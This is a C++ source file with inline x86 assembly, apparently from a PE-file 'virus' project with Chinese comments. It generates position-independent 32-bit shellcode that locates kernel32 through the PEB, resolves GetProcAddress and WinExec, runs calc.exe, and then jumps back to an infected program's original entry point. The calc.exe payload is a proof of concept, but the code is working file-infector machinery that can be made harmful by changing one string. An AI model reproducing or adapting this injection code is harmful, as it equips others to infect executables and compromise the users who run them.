#include "pe.hpp"
#include "virus.hpp"
#include <Windows.h>
#include <deque>


// 可能不支持 64 位，因为 64 位的 ImageBase 较大
std::string GetCalcuatorShellcode32(DWORD entry_point) {
	// 跳过不执行内联汇编
	goto end;
	__asm {
	start:
		call A;
	A:
		//寻找kernel32.dll的基地址
		xor ecx, ecx;
		mov eax, dword ptr fs : [ecx + 30h] ; //EAX = PEB
		mov eax, dword ptr[eax + 0Ch]; //EAX = PEB->Ldr
		mov esi, dword ptr[eax + 14h]; //ESI = PEB->Ldr.InMemOrder
		lods dword ptr[esi]; //EAX = Second module
		xchg eax, esi; //EAX = ESI, ESI = EAX
		lods dword ptr[esi]; //EAX = Third(kernel32)
		mov ebx, dword ptr[eax + 10h]; //EBX = Base address
		//查找kernel32.dll的导出表
		mov edx, dword ptr[ebx + 3Ch]; //EDX = DOS->e_lfanew
		add edx, ebx; //EDX = PE Header
		mov edx, dword ptr[edx + 78h]; //EDX = Offset export table
		add edx, ebx; //EDX = Export table
		mov esi, dword ptr[edx + 20h]; //ESI = Offset names table
		add esi, ebx; //ESI = Names table
		xor ecx, ecx; //EXC = 0
		// 在 AddressOfNames 数组中查找 GetProcAddress 函数
	Get_Function:
		inc ecx; //Increment the ordinal
		lods dword ptr[esi]; //Get name offset
		add eax, ebx; //Get function name
		// PteG
		cmp dword ptr[eax], 50746547h;
		jne Get_Function;
		// Acor
		cmp dword ptr[eax + 4], 41636F72h;
		jne Get_Function;
		// erdd
		cmp dword ptr[eax + 8], 65726464h;
		jne Get_Function;
		// FIXME
		// 这里不能够用10，那么怎么比较整个函数名称呢？
		// sser
		//cmp dword ptr[eax + 10], 73736572h;
		//jne Get_Function;
		// 根据下标(ecx)在 AddressOfNameOrdinals 找到对应的值
		mov esi, dword ptr[edx + 24h]; //ESI = Offset ordinals
		add esi, ebx; //ESI = Ordinals table
		// AddressOfNameOrdinals 是 WORD 数组
		mov cx, word ptr[esi + ecx * 2];
		dec ecx
			// AddressOfFunction 中寻找函数的 RVA
			mov esi, dword ptr[edx + 1Ch]; //ESI = Offset address table
		add esi, ebx; //ESI = Address table
		mov edx, dword ptr[esi + ecx * 4]; //EDX = Pointer(offset)
		add edx, ebx; //EDX = GetProcAddress
		push ebx; //PUSH kernel32.Base address
		push edx; //PUSH kernel32.GetProcAddress
		//寻找WinExec函数地址
		xor ecx, ecx; //ECX = 0
		push ecx; //PUSH ECX
		// cex
		mov ecx, 00636578h;
		push ecx; //PUSH ECX
		// EniW
		push 456E6957h;
		push esp; //PUSH ESP WinExec
		push ebx; //PUSH EBX kernel32.Base address
		// 调用 GetProcAddress
		call edx;
		add esp, 8; //ESP + 8
		pop ecx; //ECX = 0
		push eax; //PUSH EAX-- > kernel32.WinExec Addresss
		//赋值命令行字符串
		xor ecx, ecx; //ECX = 0
		push ecx; //PUSH ECX
		push 0x6578652E;
		push 0x636C6163; //calc.exe
		xor ebx, ebx; //EBX = 0
		mov ebx, esp; //EBX = "calc.exe"
		xor ecx, ecx;
		inc ecx;
		push ecx; //PUSH ECX = 1
		push ebx; //PUSH EBX = "calc.exe"
		// 调用 WinExec
		call eax;
		// 堆栈平衡
		// 该函数可能不会清空堆栈
		add esp, 10h;
		pop edx; //EDX = kernel32.GetProcAddress
		pop ebx; //EBX = kernel32.Base Address
		// 原来的入口点存在 shellcode 前 4 位，call 指令占据 5 个字节
		pop eax;
		// 回复栈顶指针
		add sp, 4;
		sub eax, 9;
		jmp [eax];
	};
end:
	CHAR* buffer;
	size_t len;

	__asm {
		push eax;
		push ebx;
		mov eax, start;
		mov buffer, eax;
		lea eax, end;
		lea ebx, start;
		sub eax, ebx;
		mov len, eax;
		pop ebx;
		pop eax;
	};
	std::string shellcode;
	// 存入旧的入口点
	for (int i = 0; i != sizeof(DWORD); i++) {
		shellcode.push_back(static_cast<CHAR>(entry_point >> (i * 8)));
	}
	for (size_t i = 0; i != len; i++) {
		shellcode.push_back(buffer[i]);
	}
	return shellcode;
}